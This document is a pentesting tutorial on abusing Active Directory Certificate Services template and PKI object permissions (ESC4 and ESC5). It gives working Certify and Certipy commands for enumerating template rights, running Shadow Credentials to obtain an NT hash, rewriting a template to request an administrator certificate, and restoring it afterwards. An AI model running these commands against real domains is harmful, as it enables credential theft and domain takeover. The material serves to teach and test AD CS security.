# AD CS Domain Escalation - ESC4 to ESC5

## Vulnerable Certificate Template Access Control - ESC4



### **Explanation**

The **security descriptor** on **certificate templates** defines the **permissions** specific **AD principals** possess concerning the template.

Should an **attacker** possess the requisite **permissions** to **alter** a **template** and **institute** any **exploitable misconfigurations** outlined in **prior sections**, privilege escalation could be facilitated.

Notable permissions applicable to certificate templates include:

- **Owner:** Grants implicit control over the object, allowing for the modification of any attributes.
- **FullControl:** Enables complete authority over the object, including the capability to alter any attributes.
- **WriteOwner:** Permits the alteration of the object's owner to a principal under the attacker's control.
- **WriteDacl:** Allows for the adjustment of access controls, potentially granting an attacker FullControl.
- **WriteProperty:** Authorizes the editing of any object properties.

### Abuse

To identify principals with edit rights on templates and other PKI objects, enumerate with Certify:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

An example of a privesc like the previous one:

<img src="../../../images/image (814).png" alt=""><figcaption></figcaption>

ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.

As we can see in the path above, only `JOHNPC` has these privileges, but our user `JOHN` has the new `AddKeyCredentialLink` edge to `JOHNPC`. Since this technique is related to certificates, I have implemented this attack as well, which is known as [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Here’s a little sneak peak of Certipy’s `shadow auto` command to retrieve the NT hash of the victim.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** can overwrite the configuration of a certificate template with a single command. By **default**, Certipy will **overwrite** the configuration to make it **vulnerable to ESC1**. We can also specify the **`-save-old` parameter to save the old configuration**, which will be useful for **restoring** the configuration after our attack.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```



## Vulnerable PKI Object Access Control - ESC5



### Explanation

The extensive web of interconnected ACL-based relationships, which includes several objects beyond certificate templates and the certificate authority, can impact the security of the entire AD CS system. These objects, which can significantly affect security, encompass:

- The AD computer object of the CA server, which may be compromised through mechanisms like S4U2Self or S4U2Proxy.
- The RPC/DCOM server of the CA server.
- Any descendant AD object or container within the specific container path `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. This path includes, but is not limited to, containers and objects such as the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, and the Enrollment Services Container.

The security of the PKI system can be compromised if a low-privileged attacker manages to gain control over any of these critical components.

# AD CS Domain Escalation - ESC6 to ESC7 CA VULNERABILITIES
